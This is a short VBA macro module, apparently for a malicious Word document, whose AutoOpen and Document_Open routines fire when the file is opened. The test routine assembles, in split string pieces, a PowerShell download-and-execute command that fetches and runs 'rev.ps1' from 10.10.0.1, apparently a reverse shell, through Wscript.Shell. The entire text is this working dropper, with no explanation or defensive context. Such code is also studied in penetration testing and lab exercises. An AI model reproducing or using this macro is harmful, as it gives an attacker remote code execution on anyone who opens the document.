Attribute VB_Name = "rev"
Sub AutoOpen()
    test

End Sub

Sub Document_Open()
    test

End Sub

Sub test()
    Dim Str As String
    Str = "powershell.exe ""IEX (New-Obj "
    Str = Str + "ect Net.WebClient).Download"
    Str = Str + "String('http://10.10.0"
    Str = Str + ".1/rev.ps1')"""
    CreateObject("Wscript.Shell").Run Str
End Sub
